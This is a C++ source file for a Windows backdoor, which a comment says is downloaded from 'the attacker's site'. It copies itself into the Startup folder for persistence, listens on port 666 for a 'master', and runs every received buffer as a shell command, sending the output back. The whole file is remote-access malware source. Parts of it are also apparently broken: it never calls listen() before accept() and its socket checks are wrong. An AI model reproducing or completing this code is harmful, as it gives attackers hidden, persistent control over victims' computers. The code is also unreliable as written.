#include<iostream>

#include "Network.h"
#include "Utils.h"

void telNet(SOCKET s)
{
    char* buf = new char[65536];
    std::string stdOut;
    while (1)
    {
        if(!recv(s, buf, 65536, 0))
            break;
        stdOut = executeShell(buf);
        if (!sendStdOut(s, stdOut))
            break;
    }
    delete[] buf;
}

int main(int argc, char** argv)
{
    /*running once after file is downloaded from the attacker's site*/
    if (!isInStartUp(argv[0])) //check if the application is running from the startUp directory
    {
        copyToStartUp(argv[0]);
        executeStartUpFile();
    }

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sockaddr_in addressinfo;
    uint32_t mastersIP = findMastersIP();

    if (!mastersIP)
        return 1;
    addressinfo.sin_addr.s_addr = inet_addr("0.0.0.0");
    addressinfo.sin_port = htons(666);
    addressinfo.sin_family = AF_INET;

    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    bind(s, (sockaddr*)&addressinfo, sizeof(addressinfo));
    SOCKET master = accept(s, NULL, 0);
    if (!s | !master)
        return 1;
    telNet(master);
}